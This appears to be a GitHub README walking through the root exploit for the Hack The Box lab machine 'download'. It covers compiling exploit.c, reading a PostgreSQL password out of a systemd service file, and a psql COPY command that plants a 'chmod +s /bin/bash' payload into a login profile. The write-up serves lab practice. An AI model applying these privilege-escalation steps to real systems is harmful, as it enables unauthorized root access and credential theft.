# htbdownloadroot
This is for htb seasonal lab "download"  root exploit.

For user you sholud run user.py script and wait for sometimes it will reveal passwd for ssh connection.

Then use this command in your terminal:
gcc exploit.c -o exploit -static
![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/7692b3cd-6460-4ade-8c9b-c817482612e6)

##### NOTE :- Do this all in '/tmp' dir in wesley terminal. #####
 
After that upload 'exploit' file in '/tmp' dir on Wesley terminal and run below cmd : 

NOTE :- But Before you should run this cmd ' cat /etc/systemd/system/download-site.service ' for psql passwd.
like this :- 
![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/858a69c4-b315-4a01-a748-3a6bb8c239c9)


And run this cmd after.                   
![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/064e14d7-a671-4061-8167-465e12b72fb9)

Then the last step is:-                          
![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/5c471b6b-b8e1-43a3-b685-c40a2f58c260)

                                             OR

If above one is not work in some case u can use this "root.py" file from github :-

NOTE :- Command for psql in box is " 
                       COPY (SELECT CAST('python3 /tmp/root.py "chmod +s /bin/bash;"' AS text)) TO '/var/lib/postgresql/.bash_profile'; "
![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/e2b6acc5-a991-402b-803a-b5cdc9183836)

Done you got the #root
